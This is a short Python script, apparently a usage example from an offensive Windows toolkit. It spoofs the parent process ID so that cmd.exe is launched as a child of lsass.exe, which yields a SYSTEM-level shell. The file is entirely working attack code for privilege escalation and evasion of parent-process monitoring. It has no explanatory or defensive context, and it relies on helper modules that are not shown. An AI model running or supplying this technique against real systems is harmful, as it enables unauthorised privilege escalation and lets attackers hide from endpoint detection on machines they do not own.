# -*- coding: UTF-8 -*-
# By Quentin HARDY (quentin.hardy@protonmail.com) - bobsecq

import sys
sys.path.append('../')
from utils import *
configureLogging()
from escalation import Escalation

esc = Escalation()
esc.printCandidatesSpoofPPID()
ppidLSASS = getPIDfromName('lsass.exe')
esc.spoofPPID(ppid=ppidLSASS,
                appName="c:\\windows\\system32\\cmd.exe",
                cmdLine=None,
                lpProcessAttributes = None,
                lpThreadAttributes = None,
                bInheritHandles = 0,
                creationFlags=(CREATE_NEW_CONSOLE | EXTENDED_STARTUPINFO_PRESENT),
                lpEnvironment=None,
                lpCurrentDirectory = None)